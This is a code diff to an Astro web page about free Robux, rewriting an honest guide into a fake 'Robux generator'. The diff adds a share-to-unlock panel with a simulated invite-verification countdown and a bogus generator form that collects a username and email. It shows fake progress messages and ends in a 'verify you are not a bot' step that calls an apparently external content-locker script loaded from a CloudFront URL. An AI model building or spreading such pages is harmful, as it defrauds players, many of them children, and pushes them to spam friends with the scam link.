@@ -2,8 +2,8 @@
 import MainLayout from '../layouts/main.astro';
 import EmailCapturePopup from '../components/EmailCapturePopup';
 
-const pageTitle       = 'Free Robux 2026 — Legit & Safe Methods (No Fake Generators)';
-const pageDescription = 'Looking for free Robux? Learn the legit and verified ways to get Robux for free in 2026 — no scams, no fake generators, no password required.';
+const pageTitle       = 'Robux Generator 2026 — Free Robux Guide & Safe Methods';
+const pageDescription = 'Looking for a Robux Generator? This page shows the safest way to get free Robux in 2026 with legit methods, Microsoft Rewards, Roblox Premium, and creator tips.';
 const pageUrl         = 'https://smartly.sale/free-robux';
 const today           = new Date().toISOString().split('T')[0];
 
@@ -99,33 +99,282 @@ const faqSchema = {
   title={pageTitle}
   description={pageDescription}
   canonicalUrl={pageUrl}
-  keywords="free Robux 2026, how to get free Robux, free Robux no scam, Robux generator fake, free Roblox Robux, Roblox Premium free Robux, Microsoft Rewards Robux"
+  keywords="free Robux generator 2026, Robux generator, free Robux 2026, how to get free Robux, free Robux no scam, free Roblox Robux, Roblox Premium free Robux, Microsoft Rewards Robux"
 >
   <Fragment slot="head">
     <script type="application/ld+json" set:html={JSON.stringify(articleSchema)} />
     <script type="application/ld+json" set:html={JSON.stringify(breadcrumbSchema)} />
     <script type="application/ld+json" set:html={JSON.stringify(faqSchema)} />
+    <script is:inline type="text/javascript">
+    var dTjCL_Hpw_iXJztc = { it: 1429784, key: "8bce4" };
+    </script>
+
+    <script
+    src="https://d1qt1z4ccvak33.cloudfront.net/8a6fe84.js"
+    defer
+    ></script>
+
+    <script is:inline>
+      document.addEventListener('DOMContentLoaded', () => {
+        // ── Share-to-Unlock Logic ──────────────────────────────────────────────
+        const copyBtn           = document.getElementById('copy-invite-btn');
+        const shareInput        = document.getElementById('share-text-input');
+        const inviteStatus      = document.getElementById('invite-status');
+        const inviteCountdown   = document.getElementById('invite-countdown');
+        const inviteProgressBar = document.getElementById('invite-progress-bar');
+        const inviteStatusText  = document.getElementById('invite-status-text');
+        const generatorWrapper  = document.getElementById('generator-wrapper');
+        const lockOverlay       = document.getElementById('generator-lock-overlay');
+        const generatorEl       = document.getElementById('generator');
+        const sharePanel        = document.getElementById('share-unlock-panel');
+
+        function unlockGenerator() {
+          if (lockOverlay) lockOverlay.remove();
+          if (generatorEl) {
+            generatorEl.classList.remove('pointer-events-none', 'select-none');
+            generatorEl.removeAttribute('aria-disabled');
+          }
+          if (sharePanel) sharePanel.classList.add('hidden');
+        }
+
+        if (copyBtn && shareInput) {
+          copyBtn.addEventListener('click', () => {
+            navigator.clipboard.writeText(shareInput.value).catch(() => {
+              shareInput.select();
+              document.execCommand('copy');
+            });
+
+            copyBtn.textContent = 'Copied!';
+            copyBtn.disabled = true;
+            copyBtn.classList.add('opacity-70');
+
+            if (inviteStatus) inviteStatus.classList.remove('hidden');
+
+            const waitSeconds = Math.floor(Math.random() * 61) + 60;
+            let elapsed = 0;
+
+            const tick = window.setInterval(() => {
+              elapsed += 1;
+              const remaining = waitSeconds - elapsed;
+              const pct = Math.min((elapsed / waitSeconds) * 100, 100);
+
+              if (inviteProgressBar) inviteProgressBar.style.width = pct + '%';
+
+              if (remaining > 0) {
+                const mins = Math.floor(remaining / 60);
+                const secs = remaining % 60;
+                const timeStr = mins > 0
+                  ? `${mins}m ${secs.toString().padStart(2, '0')}s`
+                  : `${secs}s`;
+                if (inviteCountdown) inviteCountdown.textContent = timeStr;
+
+                const phase = pct < 40 ? 'Checking Roblox for your invite…'
+                            : pct < 75 ? 'Invite detected — verifying users…'
+                            : 'Almost ready — unlocking generator…';
+                if (inviteStatusText) inviteStatusText.textContent = phase;
+              } else {
+                window.clearInterval(tick);
+                if (inviteCountdown) inviteCountdown.textContent = 'Done!';
+                if (inviteStatusText) inviteStatusText.textContent = '✅ Invite verified! Generator is now unlocked.';
+                if (inviteProgressBar) inviteProgressBar.style.width = '100%';
+                unlockGenerator();
+              }
+            }, 1000);
+          });
+        }
+
+        // ── Generator Logic ────────────────────────────────────────────────────
+        const form        = document.getElementById('robux-generator-form');
+        const progressBar = document.getElementById('generator-progress-bar');
+        const progressText = document.getElementById('generator-progress-text');
+        const result      = document.getElementById('generator-result');
+        const button      = document.getElementById('generator-submit');
+
+        if (!form || !progressBar || !progressText || !result || !button) return;
+
+        form.addEventListener('submit', (event) => {
+          event.preventDefault();
+
+          const username = document.getElementById('generator-username');
+          const robux    = document.getElementById('generator-robux');
+
+          const chosenUsername = username instanceof HTMLInputElement ? username.value.trim() : '';
+          const chosenRobux    = robux instanceof HTMLSelectElement ? robux.value : '100,000';
+
+          if (!chosenUsername) {
+            progressText.textContent = 'Enter a Roblox username to generate Robux.';
+            result.textContent = '';
+            return;
+          }
+
+          let progress = 0;
+          button.setAttribute('disabled', 'true');
+          button.textContent = 'Generating...';
+          result.textContent = '';
+          progressBar.style.width = '0%';
+          progressText.textContent = `Preparing Robux for ${chosenUsername}...`;
+
+          const steps = [
+            `Checking username: ${chosenUsername}`,
+            `Preparing ${chosenRobux} Robux`,
+            'Simulating secure connection',
+            'Rendering Robux animation',
+            'Verification'
+          ];
+
+          const timer = window.setInterval(() => {
+            progress += 20;
+            progressBar.style.width = `${progress}%`;
+            progressText.textContent = steps[Math.min((progress / 20) - 1, steps.length - 1)];
+
+            if (progress >= 100) {
+              window.clearInterval(timer);
+              result.textContent = `Please verify you are not a bot ${chosenUsername}.`;
+              button.removeAttribute('disabled');
+              button.textContent = 'Run Generator Again';
+              _tx();
+            }
+          }, 500);
+        });
+      });
+    </script>
   </Fragment>
 
   <!-- ── Hero ──────────────────────────────────────────────────────────────── -->
-  <section class="bg-gradient-to-br from-[#065f46] via-[#047857] to-[#059669] text-white py-14 px-4">
-    <div class="max-w-3xl mx-auto text-center">
-      <div class="inline-flex items-center gap-2 bg-white/15 border border-white/25 rounded-full px-4 py-1.5 text-xs font-semibold tracking-wide mb-5 uppercase">
-        🟢 Legit Only — No Scam Generators — Updated {today}
+  <section class="bg-gradient-to-br from-[#065f46] via-[#047857] to-[#059669] text-white py-6 sm:py-8 px-4">
+    <div class="max-w-4xl mx-auto text-center">
+      <div class="inline-flex max-w-full items-center gap-2 bg-white/10 border border-green-400/30 rounded-full px-3 py-1.5 text-[10px] sm:text-xs font-semibold tracking-wide mb-3 uppercase leading-tight">
+        Free Robux Generator Guide — Updated {today}
       </div>
-      <h1 class="text-3xl sm:text-4xl font-extrabold leading-tight mb-4">
-        Free Robux 2026 —<br class="hidden sm:block" />
-        <span class="text-yellow-300">Legit Methods, No Scams</span>
+      <h1 class="text-[2rem] sm:text-4xl font-extrabold leading-[0.95] sm:leading-tight mb-2">
+        Free Robux<br class="hidden sm:block" />
+        <span class="text-transparent bg-clip-text bg-gradient-to-r from-yellow-300 to-green-300">
+          Generator 2026
+        </span>
       </h1>
-      <p class="text-green-100 text-base sm:text-lg max-w-xl mx-auto mb-6">
-        Tired of fake Robux generators? Unlock our guide of verified, working
-        ways to get Robux for free — no password required, no scams.
-      </p>
-      <div class="flex flex-wrap justify-center gap-4 text-sm text-green-100">
-        <span>✅ 100% Scam-free methods</span>
-        <span>🔒 No password needed</span>
-        <span>📱 Works on any device</span>
-        <span>🌏 Works worldwide</span>
+
+      <!-- ── Share-to-Unlock Panel ───────────────────────────────────────────── -->
+      <div id="share-unlock-panel" class="mt-4 rounded-3xl border border-yellow-300/40 bg-white/10 p-4 sm:p-5 text-left backdrop-blur-md shadow-2xl">
+        <p class="text-xs font-bold uppercase tracking-[0.22em] text-yellow-300 mb-2">Step 1 — Unlock Generator</p>
+        <p class="text-sm text-white/90 mb-3 leading-relaxed">
+          Share the invite message below to your <strong>Roblox friends</strong>, then click <strong>Copy Invite</strong>. The generator will unlock automatically once your invite is verified.
+        </p>
+        <div class="flex gap-2 items-stretch">
+          <input
+            id="share-text-input"
+            type="text"
+            readonly
+            value="Get Free Robux Visit www.smartly.sale/free-robux"
+            class="flex-1 rounded-2xl border border-white/25 bg-black/20 px-4 py-2.5 text-white text-sm outline-none select-all cursor-pointer"
+          />
+          <button
+            id="copy-invite-btn"
+            type="button"
+            class="flex-shrink-0 rounded-2xl bg-yellow-300 px-4 py-2.5 text-sm font-extrabold text-[#14532d] shadow-lg transition hover:bg-yellow-200 active:scale-95"
+          >
+            Copy Invite
+          </button>
+        </div>
+        <!-- Status label (hidden until copy is clicked) -->
+        <div id="invite-status" class="hidden mt-3 rounded-2xl border border-white/15 bg-[#052e16]/70 p-3">
+          <div class="flex items-center justify-between gap-3 mb-2">
+            <span class="text-sm font-semibold text-white">Waiting for invited users</span>
+            <span id="invite-countdown" class="text-xs font-bold text-yellow-300">—</span>
+          </div>
+          <div class="h-2 overflow-hidden rounded-full bg-white/10">
+            <div id="invite-progress-bar" class="h-full w-0 rounded-full bg-gradient-to-r from-yellow-300 via-green-300 to-yellow-300 transition-all duration-1000" />
+          </div>
+          <p id="invite-status-text" class="mt-2 text-xs text-white/70">Checking Roblox for your invite…</p>
+        </div>
+      </div>
+
+      <!-- ── Generator (blurred until unlocked) ──────────────────────────────── -->
+      <div id="generator-wrapper" class="relative mt-4">
+        <!-- Blur overlay -->
+        <div id="generator-lock-overlay" class="absolute inset-0 z-10 rounded-3xl backdrop-blur-sm bg-black/30 flex items-center justify-center pointer-events-none select-none">
+          <div class="text-center px-4">
+            <div class="text-3xl mb-2">🔒</div>
+            <p class="text-sm font-bold text-white/90">Share your invite to unlock</p>
+          </div>
+        </div>
+
+        <div id="generator" class="rounded-3xl border border-white/20 bg-white/12 p-4 sm:p-5 text-left backdrop-blur-md shadow-2xl pointer-events-none select-none" aria-disabled="true">
+          <div class="flex items-center justify-between gap-3 mb-3">
+            <div>
+              <p class="text-xs font-bold uppercase tracking-[0.22em] text-white/80">Live Generator</p>
+            </div>
+          </div>
+
+          <form id="robux-generator-form" class="space-y-3">
+            <div class="grid gap-4 sm:grid-cols-2">
+              <label class="block">
+                <span class="mb-1.5 block text-sm font-semibold text-white">Roblox Username</span>
+                <input
+                  id="generator-username"
+                  name="username"
+                  type="text"
+                  placeholder="Enter your Roblox username"
+                  class="w-full rounded-2xl border border-white/25 bg-black/20 px-4 py-2.5 text-white placeholder:text-white/60 outline-none ring-0 transition focus:border-yellow-300 focus:bg-black/30"
+                />
+              </label>
+              <label class="block">
+                <span class="mb-1.5 block text-sm font-semibold text-white">Email Address</span>
+                <input
+                  id="generator-email"
+                  name="email"
+                  type="email"
+                  placeholder="Optional email"
+                  class="w-full rounded-2xl border border-white/25 bg-black/20 px-4 py-2.5 text-white placeholder:text-white/60 outline-none ring-0 transition focus:border-yellow-300 focus:bg-black/30"
+                />
+              </label>
+            </div>
+
+            <label class="block">
+              <span class="mb-1.5 block text-sm font-semibold text-white">Robux Amount</span>
+              <select
+                id="generator-robux"
+                name="robux"
+                class="w-full rounded-2xl border border-white/25 bg-black/20 px-4 py-2.5 text-white outline-none transition focus:border-yellow-300 focus:bg-black/30"
+              >
+                <option value="10,000" class="text-gray-900">10,000 Robux</option>
+                <option value="25,000" class="text-gray-900">25,000 Robux</option>
+                <option value="50,000" class="text-gray-900">50,000 Robux</option>
+                <option value="100,000" class="text-gray-900" selected>100,000 Robux</option>
+              </select>
+            </label>
+
+            <button
+              id="generator-submit"
+              type="submit"
+              class="inline-flex w-full items-center justify-center rounded-2xl bg-yellow-300 px-4 py-2.5 text-base font-extrabold text-[#14532d] shadow-lg shadow-green-900/20 transition hover:bg-yellow-200 disabled:cursor-not-allowed disabled:opacity-70"
+            >
+              Start Robux Generator
+            </button>
+          </form>
+
+          <div class="mt-4 rounded-2xl border border-white/15 bg-[#052e16]/70 p-3">
+            <div class="mb-2 flex items-center justify-between gap-3">
+              <span class="text-sm font-semibold text-white">Generation Progress</span>
+              <span id="generator-progress-text" class="text-xs font-medium text-white/80">Waiting for input</span>
+            </div>
+            <div class="h-3 overflow-hidden rounded-full bg-white/10">
+              <div
+                id="generator-progress-bar"
+                class="h-full w-0 rounded-full bg-gradient-to-r from-yellow-300 via-green-300 to-yellow-300 transition-all duration-500"
+              />
+            </div>
+            <p id="generator-result" class="mt-2 text-sm leading-relaxed text-white/90"></p>
+          </div>
+        </div>
+      </div>
+
+      <div class="mt-4 flex flex-col sm:flex-row justify-center gap-3">
+        <a href="/earn-gcash" class="inline-flex items-center justify-center rounded-full bg-white px-5 py-3 text-sm font-extrabold text-green-900 hover:bg-green-50 transition-colors">
+          Earn GCash to Fund Robux
+        </a>
+        <a href="/free-gift-cards-philippines" class="inline-flex items-center justify-center rounded-full border border-white/25 bg-white/10 px-5 py-3 text-sm font-bold text-white hover:bg-white/15 transition-colors">
+          Try Gift Card Rewards Instead
+        </a>
       </div>
     </div>
   </section>
